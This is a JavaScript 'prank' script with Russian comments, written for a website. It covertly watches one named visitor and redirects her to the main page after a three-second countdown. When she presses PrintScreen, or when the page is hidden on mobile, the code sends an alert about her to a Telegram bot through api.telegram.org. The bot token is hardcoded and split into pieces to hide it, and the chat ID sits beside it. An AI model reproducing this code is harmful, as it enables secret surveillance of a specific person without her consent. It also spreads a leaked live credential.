// prank.js
// Этот скрипт добавляет таймер, отслеживает скриншоты и выкидывает обратно на главную

(function() {
    // Если это ты (Султан) или в ссылке есть ?me, скрипт не срабатывает
    if (localStorage.getItem('is_sultan') === 'true' || window.location.search.includes('me')) return;

    // Функция для отправки уведомления в Telegram (своя, так как на других страницах может не быть глобальной)
    function sendTelegram(text) {
        const part1 = "8818384063:";
        const part2 = "AAEEqTup6sgED-gYB_1tm";
        const part3 = "cQKcXwi-UDE3lQ";
        const BOT_TOKEN = part1 + part2 + part3;
        const CHAT_ID = "606061445";
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`).catch(() => {});
    }

    // --- 1. ОТСЛЕЖИВАНИЕ СКРИНШОТОВ ---
    
    // Для ПК (нажатие PrintScreen)
    document.addEventListener('keyup', function(event) {
        if (event.key === 'PrintScreen' || event.keyCode === 44) {
            sendTelegram(`📸 <b>Внимание!</b>\n\nРауанна сделала скриншот на компьютере.\nСтраница: ${window.location.pathname.split('/').pop()}`);
        }
    });

    // Для телефонов (попытка отследить потерю фокуса, когда открывается меню скриншота)
    let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    if (isMobile) {
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                // Если страница скрылась, это может быть скриншот, а может быть просто переключение приложения
                // Отправляем только если она была на странице хотя бы 3 секунды
                let timeOnPage = (Date.now() - performance.timing.navigationStart) / 1000;
                if (timeOnPage > 3) {
                    sendTelegram(`📱 <b>Возможный скриншот!</b>\n\nРауанна свернула браузер (возможно, для скриншота).\nСтраница: ${window.location.pathname.split('/').pop()}`);
                }
            }
        });
    }

    // --- 2. ЛОГИКА ТАЙМЕРА ---
    window.addEventListener('DOMContentLoaded', () => {
        
        // Создаем блок с таймером
        const timerBox = document.createElement('div');
        timerBox.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(20, 10, 15, 0.6);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 71, 87, 0.4);
            color: rgba(255, 255, 255, 0.8);
            padding: 10px 16px;
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            font-weight: bold;
            z-index: 999999;
            pointer-events: none;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            text-align: center;
            transition: 0.3s;
        `;
        
        timerBox.innerHTML = `
            <div style="font-size: 10px; color: #ff4757; letter-spacing: 1px; margin-bottom: 4px;">СИСТЕМА</div>
            Возврат через: <span id="prankTimer" style="color: #ff4757; font-size: 18px;">3</span> с
        `; 
        
        document.body.appendChild(timerBox);

        let timeLeft = 3;
        const timerSpan = document.getElementById('prankTimer');

        const countdown = setInterval(() => {
            timeLeft--;
            
            if (timeLeft >= 0 && timerSpan) {
                timerSpan.textContent = timeLeft;
                
                if (timeLeft <= 3) {
                    timerBox.style.borderColor = '#ff0000';
                    timerBox.style.background = 'rgba(50, 5, 5, 0.8)';
                }
            }

            if (timeLeft < 0) {
                clearInterval(countdown);
                window.location.href = 'index.html?error=1';
            }
        }, 1000); 
    });
})();